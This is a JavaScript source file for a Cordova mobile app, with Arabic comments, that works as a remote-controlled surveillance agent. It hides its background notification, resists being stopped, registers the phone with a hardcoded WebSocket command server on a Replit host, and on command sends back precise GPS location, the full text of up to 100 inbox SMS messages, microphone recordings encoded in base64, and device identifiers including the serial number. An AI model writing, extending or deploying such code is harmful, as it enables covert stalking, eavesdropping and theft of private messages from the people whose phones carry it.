document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {
  console.log('Device is ready');
  
  // تفعيل الوضع الخلفي للاستمرار في التشغيل حتى بعد إعادة تشغيل الجوال
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.setDefaults({
      title: 'نظام المراقبة يعمل',
      text: 'التطبيق يعمل في الخلفية',
      icon: 'icon',
      color: 'FFFFFF',
      resume: true,
      hidden: true,
      bigText: true
    });
    
    cordova.plugins.backgroundMode.on('activate', function() {
      setTimeout(function() {
        cordova.plugins.backgroundMode.disableBatteryOptimizations();
      }, 500);
    });
    
    cordova.plugins.backgroundMode.enable();
    
    // منع إيقاف التطبيق تلقائياً
    if (cordova.plugins.backgroundMode.disableWebViewOptimizations) {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
    }
    
    // جعل التطبيق يعمل في الخلفية بشكل دائم
    document.addEventListener('pause', function() {
      setTimeout(function() {
        if (cordova.plugins.backgroundMode && !cordova.plugins.backgroundMode.isActive()) {
          cordova.plugins.backgroundMode.enable();
        }
      }, 2000);
    }, false);
  }

  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      // تخزين الأوامر المستلمة في localStorage
      if (data.type === 'command') {
        const commandsHistory = JSON.parse(localStorage.getItem('commandsHistory') || '[]');
        commandsHistory.push({
          id: Date.now(),
          timestamp: new Date().toISOString(),
          command: data.command,
          status: 'received'
        });
        // الاحتفاظ بآخر 100 أمر فقط
        if (commandsHistory.length > 100) {
          commandsHistory.shift();
        }
        localStorage.setItem('commandsHistory', JSON.stringify(commandsHistory));
      }
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response
            }));
            
            // تحديث حالة الأمر في السجل
            const commandsHistory = JSON.parse(localStorage.getItem('commandsHistory') || '[]');
            const commandIndex = commandsHistory.findIndex(cmd => 
              cmd.commandId === data.commandId || 
              (cmd.command && cmd.command.commandId === data.command.commandId));
              
            if (commandIndex !== -1) {
              commandsHistory[commandIndex].status = 'executed';
              commandsHistory[commandIndex].response = response;
              localStorage.setItem('commandsHistory', JSON.stringify(commandsHistory));
            }
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // إعادة الاتصال بعد تأخير
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString()
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = Date.now();
  command.commandId = commandId;
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      // إنشاء رابط خرائط جوجل مباشر
      const googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      
      callback({
        commandId,
        status: 'success',
        location: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: position.timestamp,
          googleMapsLink: googleMapsLink
        }
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 100,
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body, // سيتم عرض الرسالة كاملة بدون قص
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  
  // استخدام MediaRecorder API لتسجيل الصوت وحفظه كـ MP3
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(stream => {
        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/mpeg' });
        const audioChunks = [];
        
        mediaRecorder.ondataavailable = event => {
          audioChunks.push(event.data);
        };
        
        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
          const audioUrl = URL.createObjectURL(audioBlob);
          
          // إنشاء عنصر صوت لاختبار الملف
          const audio = new Audio();
          audio.src = audioUrl;
          
          // تحويل الصوت إلى base64 لسهولة الإرسال
          const reader = new FileReader();
          reader.onloadend = function() {
            const base64data = reader.result;
            
            // إيقاف التدفق
            stream.getTracks().forEach(track => track.stop());
            
            callback({
              commandId,
              status: 'success',
              audio: {
                duration: duration,
                format: 'mp3',
                size: audioBlob.size,
                data: base64data,
                url: audioUrl
              }
            });
          };
          reader.readAsDataURL(audioBlob);
        };
        
        setTimeout(() => {
          mediaRecorder.stop();
        }, duration * 1000);
        
        mediaRecorder.start();
      })
      .catch(error => {
        callback({ 
          commandId,
          status: 'error',
          error: 'Audio recording error',
          details: error.message
        });
      });
  } else {
    callback({ 
      commandId,
      status: 'error',
      error: 'MediaDevices API not supported'
    });
  }
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}
